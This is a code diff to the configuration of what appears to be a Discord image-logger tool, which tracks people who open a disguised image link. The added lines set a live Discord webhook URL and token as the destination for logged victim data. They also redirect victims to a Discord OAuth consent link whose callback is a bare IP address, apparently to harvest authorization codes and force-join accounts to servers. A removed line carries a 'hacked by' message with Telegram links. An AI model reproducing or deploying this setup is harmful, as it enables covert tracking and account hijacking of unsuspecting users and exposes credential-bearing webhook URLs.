@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1342002632264515624/s-08NxT_ApBUwthvt2HM2SlpE5xoontUlLPhwHbxdr--Cc3m4wNEs7YgVFD5co5zf7Tv",
+    "webhook": "https://discord.com/api/webhooks/1345751265975468082/oW2BS9jfn-NPFojBhhJO_jwG03M-VVAmTAXx7tTn34f_OXBcobi8qsX_4T3mZoXzzM7h",
     "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUhZFa258i3oheV2cYyJL5gqvOO7xSCHYRoQ&s.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "hacked by ccp shaker t.me/ccpshaker t.me/aizerisback", # Message to show
+        "message": "IDK", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "http://t.me/ccpshaker" # Link to the webpage to redirect to 
+        "page": "https://discord.com/api/oauth2/authorize?client_id=1338846425483706418&redirect_uri=http%3A%2F%2F154.26.159.230%3A2050%2Fcallback&response_type=code&scope=identify%20guilds.join" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
